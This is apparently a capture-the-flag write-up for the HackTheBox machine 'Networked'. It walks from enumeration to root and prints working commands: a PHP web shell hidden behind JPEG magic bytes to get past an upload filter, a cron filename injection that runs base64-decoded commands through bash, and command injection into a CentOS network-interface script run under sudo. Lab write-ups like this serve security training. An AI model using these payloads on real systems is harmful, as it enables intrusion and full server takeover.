Markdown# Networked - HackTheBox

- **OS:** Linux
- **Difficulty:** Easy
- **Pawn Date:** 19/08/26

---

## Recognition

### Nmap
```bash
nmap -sVC -p- <IP>
Ports found: 22, 80EnumerationWe find SSH and Apache running on their normal ports. After browsing to the web page, we see a message saying that they are building the web FaceMash, etc. Nothing too important here. So, I used gobuster to find files and folders, and after a while, we find:/index.php (200)/upload.php (200)/uploads (301)/photos.php (200)/lib.php (200)/backup (301)With /upload.php we can upload files to the server. The /backup directory contains a tar archive that I downloaded, which contains the source code of the PHP files.Code AnalysisAfter checking the source code thoroughly, we learn several things about the upload mechanism:Size: Checked, but you don't need to exceed the limit.File Type: If it's not recognized as an image, they reject the file.Extension: If the extension is not .gif, .jpg, or .png, the file gets deleted.Renaming: They change the name of the file upon upload.Vulnerability: It is vulnerable to double file extension bypasses.So, knowing all of those things, let's upload a file! We want to execute this command to plant a webshell:PHP<?php system($_GET['cmd']); ?>
However, if we upload this file raw, it will be rejected as invalid. Therefore, we prepend the JPEG magic bytes, or in my case, inject the command into the metadata/content of a .jpg file.Initial AccessVulnerability: Unrestricted File UploadVectors:Initial access: Web shell as apacheEscalation 1: apache $\rightarrow$ guly via cron injectionEscalation 2: guly $\rightarrow$ root via network script1. Payload CreationWe create the file combining magic bytes and the webshell payload:Bashecho -e '\xFF\xD8\xFF\xE0' > shell.php.jpg
echo '<?php system($_GET['cmd']); ?>' >> shell.php.jpg
2. Guly User EscalationOnce the webshell is active, we discover a cron job that poorly sanitizes and executes all filenames as commands (following a ;) under guly user permissions. We create a file with a crafted name to leverage this execution vector:Bashcurl --data-urlencode 'cmd=touch -- ";echo <base64_encoded_command> | base64 -d | bash"' http://<IP>/uploads/shell.php.jpg | strings | head
Now we have guly permissions!Escalation of PrivilegesFrom: gulyTo: rootVector: sudo -lMethod: Running sudo -l reveals a script we can execute as root. The script generates a configuration for the guly0 network interface and executes ifup guly0 at the end. Network configuration scripts on CentOS are notoriously vulnerable to command injection via spaces.To trigger the root escalation, we run the script:Bashsudo /usr/local/sbin/changename.sh
And supply the following inputs when prompted (injecting /bin/bash with a space):Plaintextinterface NAME:
aaa /bin/bash          # Note the intentional space before /bin/bash

interface PROXY_METHOD:
aaa

interface BROWSER_ONLY:
aaa

interface BOOTPROTO:
aaa
And now we are root! You can verify it with whoami.Lessons LearnedDouble extension bypasses: Servers often check extensions improperly or rely on weak MIME-type checks.Cron jobs executing filenames without sanitization: A direct path to command injection.Always check sudo -l first: Essential step when pivoting or escalating privileges locally.CentOS/RHEL Network scripts: Vulnerable to command injection via spaces in interface configuration prompts.GTFOBins: An invaluable resource when encountering custom or native binaries under sudo -l.
